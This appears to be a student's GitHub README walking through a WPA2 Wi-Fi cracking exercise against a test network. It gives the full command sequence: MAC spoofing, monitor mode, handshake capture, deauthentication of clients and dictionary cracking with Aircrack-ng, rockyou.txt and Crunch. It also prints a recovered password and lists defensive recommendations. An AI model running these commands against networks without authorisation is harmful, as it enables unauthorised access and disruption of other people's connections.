# network-cracking-aircrack
Wi-Fi penetration testing using Aircrack-ng and PCI utilities. Demonstrates handshake capture, dictionary attacks, and integration with IoT devices for academic red team research.

# WPA2 Wi-Fi Penetration Testing Using Aircrack-ng
This project demonstrates how a WPA2-protected wireless network can be compromised using penetration testing tools and methods. The simulation was conducted on a test network called **R&J Ventures**, using **Aircrack-ng** and the **rockyou.txt** wordlist.

> 🔒 This work was done purely for academic and ethical hacking purposes.

---

## 🛠 Tools Used
| Tool          | Purpose |
|---------------|---------|
| **Aircrack-ng Suite** | Capture and crack WPA2 handshakes |
| **Airodump-ng** | Scan and lock on Wi-Fi target |
| **Aireplay-ng** | Launch deauthentication attack |
| **macchanger** | Randomize MAC address |
| **rockyou.txt** | Public wordlist used for dictionary attack |
| **Crunch (optional)** | Generate custom password lists (not used here but explained below) |

---

## 🧪 Test Setup
- **OS**: Kali GNU/Linux  
- **Wi-Fi Adapter**: External card with monitor mode support  
- **Target SSID**: R&J Ventures  
- **BSSID**: FA:6A:9C:BC:C7:AD  
- **Wordlist**: `/usr/share/wordlists/rockyou.txt`  

---

## 🔍 Step-by-Step Implementation

### 1. Spoof MAC Address
To improve anonymity, we randomized the MAC address of the interface.  

Check your interface MAC address:
```bash
ifconfig
```
Change your MAC address:
```bash
sudo macchanger -r wlan0 # Replace wlan0 with the name of your interface card
```


### 2. Enable Monitor Mode
Check the wireless card mode:
```bash
iwconfig
```
Switch the wireless card to monitor mode to capture packets:
```bash
sudo airmon-ng start wlan0  # Replace wlan0 with the name of your interface card
```


### 3. Scan for Nearby Networks
Identify all visible Wi-Fi networks and note the target's channel and BSSID:
```bash
sudo airodump-ng wlan0
```


### 4. Lock on Target (R&J Ventures)
Focused scan on the R&J Ventures network to capture WPA handshake packets:
```bash
airodump-ng -c 6 --bssid FA:6A:9C:BC:C7:AD -w r-j-ventures wlan0 # Replace -c and -bssid with your target network
```
NB: (a) -c = Specifies the channel number (in this case, channel 6) where the target network is operating.
    (b) --bssid = Locks onto the target network’s unique BSSID (MAC address) to focus the capture.
    (c) -w = Saves the captured packets (including the handshake) to a file named capture-01.cap. The file name can be anything based on how you saved it.


### 5. Deauthentication Attack
Forced a connected client to reconnect and generate the handshake:
```bash
sudo aireplay-ng --deauth 10 -a FA:6A:9C:BC:C7:AD wlan0
```
Check if the handshake is captured:
```bash
sudo aircrack-ng r-j-ventures-01.cap  # Replace r-j-ventures-01.cap with the name of your file
```


### 6. Crack WPA2 Password
Use Aircrack-ng and rockyou.txt to crack the captured handshake:
```bash
sudo aircrack-ng r-j-ventures-01.cap -w /usr/share/wordlists/rockyou.txt
```


### 7. Password Found
Password found: reed0710ko


💡 Bonus: What If rockyou.txt Fails?
If public wordlists fail, tools like Crunch can create custom wordlists based on patterns (e.g. names, dates, formats):
```bash
crunch 8 12 -t jeff@@@@ -o mylist.txt
```
NB: Use mylist.txt with Aircrack-ng just like rockyou.



🛡️ Security Recommendations
1. Use long, random passwords not found in dictionaries
2. Upgrade to WPA3 if supported
3. Disable WPS (Wi-Fi Protected Setup)
4. Monitor for repeated deauth packets or spoofed MACs
5. Set router to limit handshake replays


📚 Conclusion
This simulation confirmed that WPA2 networks using weak passwords remain vulnerable to dictionary-based brute-force attacks. 
Ethical penetration testing helps organizations identify such flaws and improve security posture.


👨‍💻 Author
Jeffrey Adams
Cybersecurity Student – University of Mines and Technology (UMaT)
GitHub: @adamsjeffrey779-secureb4





 



 

